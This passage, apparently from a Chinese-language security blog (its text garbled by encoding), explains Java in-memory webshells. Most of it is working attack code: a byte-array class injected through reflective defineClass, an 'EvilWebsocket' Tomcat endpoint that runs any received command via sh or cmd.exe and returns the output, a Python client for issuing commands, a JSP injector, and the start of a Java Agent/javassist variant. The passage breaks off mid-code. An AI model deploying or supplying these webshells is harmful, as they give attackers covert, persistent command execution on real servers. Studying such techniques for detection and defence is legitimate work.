class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, -<span class="number">112</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">122</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">65</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">42</span>, <span class="number">43</span>, -<span class="number">75</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">43</span>, <span class="number">42</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">42</span>, <span class="number">43</span>, -<span class="number">64</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">28</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, -<span class="number">118</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">6</span>, <span class="number">9</span>&#125;;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                clazz = (Class) method.invoke(cl, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">                <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(clazz, urlPath).build();</span><br><span class="line">                <span class="type">WsServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">null</span> == container.findMapping(urlPath)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        container.addEndpoint(configEndpoint);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (DeploymentException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EvilWebsocketç±»ï¼Œä¸»è¦æ˜¯æƒ³æ‹¿åˆ°å®ƒçš„å­—èŠ‚ç ï¼Œç„¶ååŠ è½½è¿›JVMä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.EndpointConfig;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.MessageHandler;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Session;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            session.getBasicRemote().sendText(output);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åå¯ä»¥ä½¿ç”¨ä»¥ä¸‹pythonä»£ç ä½œä¸ºä¸€ä¸ªç®€å•çš„websocketå®¢æˆ·ç«¯æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(<span class="string">&quot;ws://127.0.0.1:8080/evilWebsocket&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command != <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        ws.send(command)</span><br><span class="line">        result = ws.recv()</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ws.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26fe21ddac507cc0a3c5c.jpg" title="image-20230804112541811" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fe21ddac507cc0a3c5c.jpg" alt="image-20230804112541811"></a></p><h4 id="jspæ³¨å…¥Tomcat-Websocket-å‹å†…å­˜é©¬"><a href="#jspæ³¨å…¥Tomcat-Websocket-å‹å†…å­˜é©¬" class="headerlink" title="jspæ³¨å…¥Tomcat-Websocket å‹å†…å­˜é©¬"></a>jspæ³¨å…¥Tomcat-Websocket å‹å†…å­˜é©¬</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> Session session;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String command)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                session.getBasicRemote().sendText(output);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.session = session;</span><br><span class="line">            session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/evilWebsocket&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(EvilWebsocket.class, path).build();</span><br><span class="line">    <span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) servletContext.getAttribute(<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        container.addEndpoint(configEndpoint);</span><br><span class="line">        servletContext.setAttribute(path,path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Java-Agent-å‹å†…å­˜é©¬"><a href="#Java-Agent-å‹å†…å­˜é©¬" class="headerlink" title="Java-Agent å‹å†…å­˜é©¬"></a>Java-Agent å‹å†…å­˜é©¬</h3><h4 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>Java Agent èƒ½å¤Ÿåœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„æƒ…å†µä¸‹æ¥ä¿®æ”¹å­—èŠ‚ç ï¼Œå³åŠ¨æ€ä¿®æ”¹å·²åŠ è½½æˆ–è€…æœªåŠ è½½çš„ç±»ï¼ŒåŒ…æ‹¬ç±»çš„å±æ€§ã€æ–¹æ³•ã€‚Agent å†…å­˜é©¬çš„å®ç°å°±æ˜¯åˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§ä½¿å…¶åŠ¨æ€ä¿®æ”¹ç‰¹å®šç±»çš„ç‰¹å®šæ–¹æ³•ï¼Œå°†æˆ‘ä»¬çš„æ¶æ„ä»£ç æ·»åŠ è¿›å»ã€‚</p><p>Java Agent æ”¯æŒä¸¤ç§æ–¹å¼è¿›è¡ŒåŠ è½½ï¼š</p><ol><li><p>å®ç° premain æ–¹æ³•ï¼Œåœ¨å¯åŠ¨æ—¶è¿›è¡ŒåŠ è½½ ï¼ˆè¯¥ç‰¹æ€§åœ¨ jdk 1.5 ä¹‹åæ‰æœ‰ï¼‰</p></li><li><p>å®ç° agentmain æ–¹æ³•ï¼Œåœ¨å¯åŠ¨åè¿›è¡ŒåŠ è½½ ï¼ˆè¯¥ç‰¹æ€§åœ¨ jdk 1.6 ä¹‹åæ‰æœ‰ï¼‰</p></li></ol><p>å®ç° premain æ–¹æ³•åœ¨RASPä¸­å¿…ç”¨åˆ°ï¼Œä½†æ˜¯å› ä¸ºé€šè¿‡premainæ³¨å…¥å†…å­˜é©¬è¿‡äºé¸¡è‚‹ï¼Œéœ€è¦é‡æ–°å¯åŠ¨WebæœåŠ¡ï¼Œåˆ¶å®š-javaagentï¼Œè¿™é‡Œå°±ä¸å†ä»‹ç»ã€‚å…ˆå†™ä¸€ä¸ªç®€å•çš„å®ç°äº†agentmain æ–¹æ³•çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TestTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// å¯¹ç±»è¿›è¡Œé‡æ–°å®šä¹‰</span></span><br><span class="line">                    inst.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;System.out.println(\&quot;Attach Successful!\&quot;);&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = 